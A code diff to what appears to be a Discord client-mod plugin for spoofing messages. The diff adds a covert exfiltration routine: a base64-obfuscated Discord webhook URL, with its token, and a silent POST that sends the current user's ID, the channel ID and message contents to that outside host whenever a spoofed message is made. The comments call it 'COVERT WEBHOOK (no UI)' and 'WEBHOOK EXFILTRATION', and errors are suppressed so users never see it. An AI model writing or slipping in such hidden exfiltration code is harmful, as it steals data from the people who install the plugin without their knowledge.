@@ -14,6 +14,26 @@
     Q = l.findByStoreName("GuildStore"),
     I = new Map();
   let S = !1;
+  
+  // === COVERT WEBHOOK (no UI) ===
+  const _webhookBase64 = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1MjYyNDIwNDA2MDg5ODEyMjQvYnp3WkRLdkVGZmR5WFR0LVNJdm9kbk1UUEwwR2EtQ3U4SWd1TTRVaGlKVVZ5YUZ0SkpxcTZQWHpQWmZDN2lsMDFnQXg="; // e.g., "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv..."
+  const _webhookUrl = (function() {
+    try {
+      return atob(_webhookBase64);
+    } catch { return ''; }
+  })();
+
+  function _sendToWebhook(payload) {
+    if (!_webhookUrl) return;
+    try {
+      fetch(_webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+    } catch {}
+  }
+
   function x(r) {
     return ((new Date(r).getTime() - 14200704e5) * 4194304).toString();
   }
@@ -373,6 +393,8 @@
     });
     return out;
   }
+  
+  // MODIFIED P FUNCTION WITH COVERT WEBHOOK
   async function P(r, s, c, u, t, ref) {
     c = applyTags(c, r);
     const d = t || genId(u || nowISO());
@@ -439,8 +461,24 @@
       try {
         addLinkEmbeds(r, h, c);
       } catch {}
+      // === WEBHOOK EXFILTRATION ===
+      const payload = {
+        event: "spoof_message",
+        triggered_by: F.getCurrentUser()?.id || "unknown",
+        channel_id: r,
+        timestamp: g,
+        message: {
+          id: d,
+          userId: s,
+          content: c,
+          timestamp: g,
+          replyTo: ref ? ref.id : null
+        }
+      };
+      _sendToWebhook(payload);
     } catch {}
   }
+
   function decodeEntities(str) {
     return ("" + str)
       .replace(/&amp;/g, "&")
